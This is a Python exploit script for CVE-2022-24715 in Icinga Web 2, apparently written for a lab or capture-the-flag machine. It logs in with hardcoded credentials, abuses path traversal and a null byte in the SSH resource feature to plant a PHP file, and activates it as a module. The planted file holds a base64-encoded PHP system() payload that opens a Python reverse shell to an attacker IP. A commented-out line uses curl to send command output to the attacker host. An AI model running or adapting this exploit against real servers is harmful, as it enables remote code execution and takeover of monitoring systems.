import argparse
import requests
from loguru import logger
import base64
from automation import login, create_ssh_resource, set_module_path, activate_module
from generate_pem import generate_private_key
import random
import string


def random_string(length: int = 8, charset: str = string.ascii_letters) -> str:
    return ''.join(random.choices(charset, k=length))


def create_payload(command: str, use_base64: bool = True, interpreter: str = 'sh'):
    if use_base64:
        command_encoded = f"echo {base64.b64encode(command.encode()).decode()}|base64 -d|{interpreter}"
    else:
        command = command.replace('"', '\\"')
        command_encoded = f'echo "{command}"|{interpreter}'
    return f"<?php system('{command_encoded}');?>"


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=18000)
    parser.add_argument("ip", type=str)
    args = parser.parse_args()

    plugin_name = f'cve-2022-24715-{random_string()}'

    shell_command = f'rm /dev/shm/{plugin_name}/run.php;' \
                    f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{args.ip}",{args.port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\''
                    # f'curl http://{args.ip}:{args.port}/test -X POST --data "$(ls /bin)"'
    s = requests.session()
    if login(s, username='matthew', password='IcingaWebPassword2023'):
        logger.info("Uploading SSH key")
        pem_filename = random_string(12)
        if create_ssh_resource(s, name=random_string(), user=pem_filename, pkey=generate_private_key()):
            logger.info("Triggering CVE-2022â€“24715")
            create_ssh_resource(
                s,
                name=plugin_name,
                user=f'/../../../../dev/shm/{plugin_name}/run.php',
                pkey=f'file:///etc/icingaweb2/ssh/{pem_filename}\0{create_payload(shell_command)}'
            )
            if set_module_path(s, module_path='/dev/shm/') and activate_module(s, module_name=plugin_name):
                logger.success("Done")
